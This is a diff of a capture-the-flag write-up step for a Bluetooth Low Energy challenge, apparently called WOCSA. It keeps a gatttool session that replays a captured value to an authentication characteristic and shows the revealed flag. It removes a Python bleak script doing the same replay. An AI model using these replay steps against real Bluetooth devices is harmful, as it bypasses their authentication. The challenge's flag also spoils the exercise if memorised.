@@ -47,35 +47,10 @@ The handle maps to: `facade00-0002-1000-8000-00805f9b34fb` (AUTH characteristic)
 
 ## ▶️ Step 4: Replay the Payload
 
-### Option A — gatttool
-
 ```bash
 gatttool -b AA:BB:CC:DD:EE:FF -I
 [AA:BB:CC:DD:EE:FF][LE]> connect
 [AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x000b deadbeef
-```
-
-### Option B — Python (bleak)
-
-```python
-import asyncio
-from bleak import BleakClient
-
-MAC = "AA:BB:CC:DD:EE:FF"
-AUTH_UUID = "facade00-0002-1000-8000-00805f9b34fb"
-FLAG_UUID = "facade00-0001-1000-8000-00805f9b34fb"
-
-MAGIC = bytes.fromhex("DEADBEEF")
-
-async def main():
-    async with BleakClient(MAC) as client:
-        print("[*] Connected. Replaying magic payload...")
-        await client.write_gatt_char(AUTH_UUID, MAGIC)
-
-        value = await client.read_gatt_char(FLAG_UUID)
-        print(f"[+] Flag: {value.decode()}")
-
-asyncio.run(main())
 ```
 
 ---
@@ -90,8 +65,6 @@ Expected output:
 ```
 Characteristic value/descriptor: 57 4f 43 53 41 7b...
 ```
-
-Or the Python script above will print it directly.
 
 ```
 WOCSA{replay_attacks_bypass_auth}
